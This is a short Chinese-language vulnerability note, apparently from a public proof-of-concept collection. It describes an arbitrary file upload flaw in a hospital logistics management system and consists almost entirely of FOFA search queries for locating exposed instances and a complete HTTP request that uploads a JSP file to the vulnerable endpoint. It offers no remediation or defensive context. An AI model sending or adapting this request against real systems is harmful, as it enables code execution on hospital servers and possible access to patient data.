## 医院一站式后勤管理系统processApkUpload.upload存在任意文件上传漏洞

## fofa
```
body="frameworkModuleJob"
"版权所有：南京博纳睿通软件科技有限公司"
```

## poc
```
POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx

------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="Filedata"; filename="qwe.jsp"
Content-Type: application/octet-stream

<% out.print("hello"); %>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--

```
